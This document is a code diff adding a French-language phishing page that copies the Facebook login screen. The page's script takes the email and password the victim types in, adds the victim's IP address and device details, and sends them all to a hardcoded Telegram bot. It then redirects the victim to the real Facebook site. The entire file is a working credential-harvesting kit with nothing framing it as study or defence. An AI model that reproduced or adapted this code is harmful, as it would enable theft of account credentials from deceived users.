@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Facebook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: 'Helvetica', 'Arial', sans-serif;
+        }
+        .login-container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .facebook-logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        .btn-facebook {
+            background-color: #1877f2;
+            color: white;
+            font-weight: bold;
+            border: none;
+        }
+        .btn-facebook:hover {
+            background-color: #145db2;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            font-weight: bold;
+            border: none;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            display: block;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .meta-logo img {
+            width: 60px;
+            opacity: 0.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
+             alt="Logo Facebook" 
+             class="facebook-logo">
+        <form id="login-form">
+            <input id="email" type="text" class="form-control mb-3" placeholder="Adresse e-mail ou numéro de mobile" required>
+            <input id="password" type="password" class="form-control mb-3" placeholder="Mot de passe" required>
+            <button type="submit" class="btn btn-facebook w-100">Se connecter</button>
+            <a href="https://www.facebook.com/recover/initiate" class="forgot-password" target="_blank">Mot de passe oublié ?</a>
+            <hr>
+            <button type="button" class="btn create-account w-100" id="create-account">Créer un nouveau compte</button>
+        </form>
+        <p class="meta-logo">
+            <img src="imge/Meta_Platforms-Logo.wine.svg" 
+                 alt="Logo Meta">
+        </p>
+    </div>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7593409061:AAHEPCTCLtvxaAWcEym79gL8ueHRB7tvDXg";
+        const CHAT_ID = "6015215674";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Ordinateur';
+
+                    const message = ` 
+                        <b>Nouvelle tentative de connexion</b>\n
+                        <b>Email :</b> ${email}\n
+                        <b>Mot de passe :</b> ${password}\n
+                        <b>Adresse IP :</b> ${ip}\n
+                        <b>Type d'appareil :</b> ${deviceType}\n
+                        <b>Plateforme :</b> ${platform}\n
+                        <b>Agent utilisateur :</b> ${userAgent}\n
+                        <b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(() => {
+                        window.location.href = "https://www.facebook.com";
+                    }).catch(() => {
+                        alert('Erreur lors de l\'envoi des informations. Veuillez réessayer.');
+                    });
+                })
+                .catch(() => {
+                    alert('Erreur lors de la récupération de l\'adresse IP. Veuillez réessayer.');
+                });
+        });
+
+        document.getElementById('create-account').addEventListener('click', function() {
+            window.location.href = "https://www.facebook.com/r.php";
+        });
+    </script>
+</body>
+</html>
